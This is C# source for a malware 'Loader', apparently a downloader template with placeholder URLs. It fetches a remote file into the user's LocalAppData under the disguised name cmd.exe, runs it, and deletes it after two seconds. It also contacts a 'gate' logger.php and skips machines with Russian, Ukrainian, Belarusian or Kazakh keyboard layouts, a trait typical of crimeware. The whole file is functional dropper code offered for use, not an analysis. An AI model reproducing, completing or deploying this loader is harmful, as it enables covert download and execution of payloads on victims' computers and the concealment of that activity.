using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;

namespace Loader
{
    class Program
    {
        static void Main(string[] args)
        {
            if (langs()) return;

            DownloadFromServer("YOUR URL TO FILE");
            Logger("YOUR ULR TO GATE");
            Starter();
        }

        private static void DownloadFromServer(string serverFilepath)
        {
            using(WebClient client = new WebClient())
            {
                client.DownloadFile(serverFilepath, Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"/cmd.exe");
            }
        }

        private static void Logger(string urlLogger)
        {
            WebRequest request = WebRequest.Create(urlLogger + @"/logger.php");
        }

        private static void Starter()
        {
            Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"/cmd.exe");
            Thread.Sleep(2000);
            File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"/cmd.exe");
        }

        private static bool langs()
        {
            try
            {
                InputLanguageCollection lang = InputLanguage.InstalledInputLanguages;
                string[] cislangs = new string[] { "Kazakh", "Russian", "Belarusian", "Ukrainian"};
                foreach (object langs in lang)
                {
                    foreach (string langs2 in cislangs)
                    {
                        if (((InputLanguage)langs).Culture.EnglishName.Contains(langs2))
                        {
                            return true;
                        }
                    }
                }
                return false;
            }
            catch
            {
                return true;
            }
        }
    }
}
